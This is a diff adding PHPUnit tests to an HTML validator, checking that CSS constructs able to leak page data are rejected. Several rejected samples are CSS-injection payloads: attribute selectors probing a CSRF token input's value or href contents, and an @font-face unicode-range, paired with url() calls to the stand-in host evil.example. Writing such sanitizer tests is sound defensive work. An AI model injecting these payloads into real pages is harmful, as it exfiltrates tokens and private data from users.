@@ -8,7 +8,8 @@ use PHPUnit\Framework\Attributes\DataProvider;
 
 /**
  * CSS in the style attribute and the <style> element: the constructs that ran script in
- * some browser, backslash escapes that hide them, and the schemes url() may use.
+ * some browser, backslash escapes that hide them, the schemes url() may use, and the two
+ * selectors that let a style sheet leak what is on the page.
  *
  * Code: css-not-allowed.
  */
@@ -95,6 +96,54 @@ final class CssTest extends HtmlValidatorTestCase
     public function testStyleElementContentIsNotEntityDecoded(): void
     {
         $this->assertAccepts('<style>p::before { content: "expression&#40;" }</style>');   // raw text to a browser, so the entity stays
+    }
+
+    //endregion
+    //region Page Data Leaks
+
+    /**
+     * A selector that matches on page data plus a url() to another host sends that data there:
+     * [value^="a"] tests an input's value one character at a time, and @font-face unicode-range
+     * loads the font only when a character is on the page.
+     */
+    #[DataProvider('leakProvider')]
+    public function testSelectorsThatLeakPageDataAreRefused(string $css, string $detail): void
+    {
+        $this->assertRejects("<style>$css</style>", 'css-not-allowed', $detail);
+    }
+
+    public static function leakProvider(): array
+    {
+        return [
+            'starts with'            => ['input[name=csrf][value^="a"] { background: url(//evil.example/?a) }', '[value^='],
+            'ends with'              => ['input[value$="a"] { background: url(//evil.example/?a) }', '[value$='],
+            'contains'               => ['a[href*="token="] { background: url(//evil.example/?a) }', '[href*='],
+            'spaces around'          => ['input[ value ^= "a" ] { color: red }', '[ value ^='],
+            'comment inside'         => ['input[value/**/^="a"] { color: red }', '[value/**/^='],
+            'uppercase'              => ['INPUT[VALUE^="a"] { color: red }', '[VALUE^='],
+            'no url at all'          => ['input[value^="a"] { color: red }', '[value^='],   // the rule is the selector, whatever follows it
+            'unicode-range'          => ['@font-face { font-family: f; src: url(https://evil.example/f); unicode-range: U+65 }', 'unicode-range'],
+            'unicode-range spaced'   => ['@font-face { unicode-range : U+65 }', 'unicode-range'],
+        ];
+    }
+
+    #[DataProvider('harmlessSelectorProvider')]
+    public function testOtherSelectorsPass(string $css): void
+    {
+        $this->assertAccepts("<style>$css</style>");
+    }
+
+    public static function harmlessSelectorProvider(): array
+    {
+        return [
+            'exact match'            => ['input[type=text] { border: 1px solid #ccc }'],
+            'exact match quoted'     => ['a[href="https://example.com/"] { color: red }'],
+            'word match'             => ['[class~="x_body"] { margin: 0 }'],
+            'dash match'             => ['[lang|="en"] { quotes: none }'],
+            'presence'               => ['input[disabled] { opacity: .5 }'],
+            'font-face without range' => ['@font-face { font-family: f; src: url(https://fonts.example/f.woff2) }'],
+            'attribute selector then url' => ['input[type=text] { background: url(https://cdn.example/bg.png) }'],
+        ];
     }
 
     //endregion
